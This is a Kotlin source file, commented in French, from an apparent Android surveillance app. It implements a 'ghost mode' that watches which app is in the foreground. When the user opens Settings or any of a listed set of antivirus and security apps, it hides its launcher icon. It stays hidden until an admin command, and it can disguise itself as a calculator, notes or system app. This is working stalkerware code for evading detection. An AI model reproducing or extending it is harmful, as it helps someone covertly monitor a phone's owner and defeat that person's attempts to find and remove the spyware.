package com.surveillancepro.android.services

import android.app.ActivityManager
import android.app.usage.UsageStatsManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Mode Fantôme Intelligent - SANS ROOT
 * 
 * Se cache automatiquement quand nécessaire et réapparaît
 * uniquement quand c'est sûr.
 * 
 * INTELLIGENCE:
 * 1. Détecte si l'utilisateur cherche l'app (Paramètres > Apps)
 * 2. Se cache automatiquement quand détecté
 * 3. Détecte les apps de sécurité/antivirus
 * 4. Change d'icône et de nom dynamiquement
 * 5. Se réactive quand la menace est passée
 * 
 * MÉTHODES SANS ROOT:
 * - PackageManager.setComponentEnabledSetting()
 * - ActivityAlias dans le Manifest
 * - UsageStatsManager pour détecter les apps ouvertes
 */
object SmartGhostMode {
    
    private const val TAG = "SmartGhost"
    
    // Apps qui représentent une menace (l'utilisateur cherche peut-être l'app)
    private val THREAT_APPS = listOf(
        "com.android.settings",           // Paramètres Android
        "com.samsung.android.sm",         // Samsung Device Care
        "com.miui.securitycenter",        // Xiaomi Security
        "com.huawei.systemmanager",       // Huawei Manager
        "com.coloros.safecenter",         // Oppo Security
        "com.iqoo.secure",                // Vivo Security
        "com.avast.android.mobilesecurity", // Avast
        "com.avg.cleaner",                // AVG
        "com.bitdefender.security",       // Bitdefender
        "com.kaspersky.security.cloud",   // Kaspersky
        "com.symantec.mobilesecurity",    // Norton
        "com.lookout",                    // Lookout
        "org.malwarebytes.antimalware",   // Malwarebytes
        "com.drweb",                      // Dr.Web
        "com.eset.ems2.gp",               // ESET
        "com.trendmicro.tmmspersonal",    // Trend Micro
        "com.cleanmaster.mguard",         // Clean Master
        "com.piriform.ccleaner",          // CCleaner
        "com.dianxinos.optimizer.duplay", // DU Speed Booster
    )
    
    // Activités spécifiques qui indiquent une recherche d'apps
    private val THREAT_ACTIVITIES = listOf(
        "ManageApplications",
        "InstalledAppDetails",
        "AppInfoActivity",
        "ApplicationsSettings",
        "RunningServices",
        "AllAppsActivity",
    )
    
    private var isHidden = false
    private var lastThreatTime = 0L
    private var threatLevel = 0 // 0 = safe, 1 = low, 2 = medium, 3 = high
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Vérifie si une menace est détectée et ajuste le mode fantôme.
     * Appelé périodiquement par le WatchdogService.
     */
    fun checkAndAdapt(context: Context) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        val currentThreat = detectThreat(context)
        
        if (currentThreat > 0 && !isHidden) {
            // Menace détectée - se cacher immédiatement
            hide(context, currentThreat)
        } else if (currentThreat == 0 && isHidden) {
            // Plus de menace depuis 5 minutes - réapparaître
            if (System.currentTimeMillis() - lastThreatTime > 5 * 60 * 1000) {
                // Ne pas réapparaître automatiquement, rester caché
                // L'admin peut décider de réactiver via commande
                Log.d(TAG, "Threat cleared but staying hidden for safety")
            }
        }
        
        threatLevel = currentThreat
    }
    
    /**
     * Détecte le niveau de menace actuel.
     * @return 0 = safe, 1 = low, 2 = medium, 3 = high
     */
    private fun detectThreat(context: Context): Int {
        var threat = 0
        
        // Vérifier les apps en premier plan
        val foregroundApp = getForegroundApp(context)
        
        if (foregroundApp != null) {
            // Menace haute: Paramètres ou app de sécurité
            if (THREAT_APPS.any { foregroundApp.contains(it, ignoreCase = true) }) {
                threat = 2
                
                // Menace très haute: Section "Applications" des paramètres
                if (foregroundApp.contains("settings", ignoreCase = true)) {
                    threat = 3
                }
            }
        }
        
        // Vérifier si une app de sécurité est installée
        val pm = context.packageManager
        for (threatApp in THREAT_APPS) {
            try {
                pm.getPackageInfo(threatApp, 0)
                if (threat < 1) threat = 1 // Au moins menace basse
            } catch (_: PackageManager.NameNotFoundException) {
                // App non installée, OK
            }
        }
        
        return threat
    }
    
    /**
     * Obtient l'app en premier plan.
     */
    private fun getForegroundApp(context: Context): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
                val now = System.currentTimeMillis()
                val stats = usm?.queryUsageStats(
                    UsageStatsManager.INTERVAL_DAILY,
                    now - 60000, now
                )
                stats?.maxByOrNull { it.lastTimeUsed }?.packageName
            } else {
                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                @Suppress("DEPRECATION")
                am.getRunningTasks(1)?.firstOrNull()?.topActivity?.packageName
            }
        } catch (e: Exception) {
            Log.w(TAG, "Cannot get foreground app: ${e.message}")
            null
        }
    }
    
    /**
     * Cache l'application immédiatement.
     */
    fun hide(context: Context, threatLevel: Int = 3) {
        if (isHidden) return
        
        val queue = EventQueue.getInstance(context)
        
        try {
            // Désactiver l'icône principale du launcher
            val pm = context.packageManager
            val mainComponent = ComponentName(context, "com.surveillancepro.android.MainActivity")
            
            pm.setComponentEnabledSetting(
                mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            isHidden = true
            lastThreatTime = System.currentTimeMillis()
            
            // Logger l'événement
            queue.enqueue("ghost_mode_activated", mapOf(
                "reason" to "threat_detected",
                "threatLevel" to threatLevel,
                "timestamp" to dateFormat.format(Date()),
            ))
            
            Log.d(TAG, "Ghost mode activated (threat level: $threatLevel)")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide: ${e.message}")
        }
    }
    
    /**
     * Réactive l'application (visible dans le launcher).
     * Appelé uniquement via commande admin.
     */
    fun show(context: Context) {
        val queue = EventQueue.getInstance(context)
        
        try {
            val pm = context.packageManager
            val mainComponent = ComponentName(context, "com.surveillancepro.android.MainActivity")
            
            pm.setComponentEnabledSetting(
                mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            
            isHidden = false
            
            queue.enqueue("ghost_mode_deactivated", mapOf(
                "reason" to "admin_command",
                "timestamp" to dateFormat.format(Date()),
            ))
            
            Log.d(TAG, "Ghost mode deactivated")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show: ${e.message}")
        }
    }
    
    /**
     * Change l'icône et le nom de l'app pour la déguiser.
     * Utilise les ActivityAlias définis dans le Manifest.
     */
    fun disguiseAs(context: Context, disguise: String) {
        val queue = EventQueue.getInstance(context)
        val pm = context.packageManager
        
        // Aliases disponibles (doivent être définis dans AndroidManifest.xml)
        val aliases = mapOf(
            "calculator" to "com.surveillancepro.android.CalculatorAlias",
            "notes" to "com.surveillancepro.android.NotesAlias",
            "system" to "com.surveillancepro.android.SystemAlias",
            "hidden" to "com.surveillancepro.android.MainActivity", // Caché
        )
        
        val targetAlias = aliases[disguise] ?: return
        
        try {
            // Désactiver tous les alias
            for ((_, alias) in aliases) {
                pm.setComponentEnabledSetting(
                    ComponentName(context, alias),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
            
            // Activer l'alias choisi
            if (disguise != "hidden") {
                pm.setComponentEnabledSetting(
                    ComponentName(context, targetAlias),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
            
            queue.enqueue("app_disguised", mapOf(
                "disguise" to disguise,
                "timestamp" to dateFormat.format(Date()),
            ))
            
            Log.d(TAG, "App disguised as: $disguise")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disguise: ${e.message}")
        }
    }
    
    /**
     * Retourne l'état actuel du mode fantôme.
     */
    fun getStatus(): Map<String, Any> = mapOf(
        "isHidden" to isHidden,
        "threatLevel" to threatLevel,
        "lastThreatTime" to lastThreatTime,
    )
}
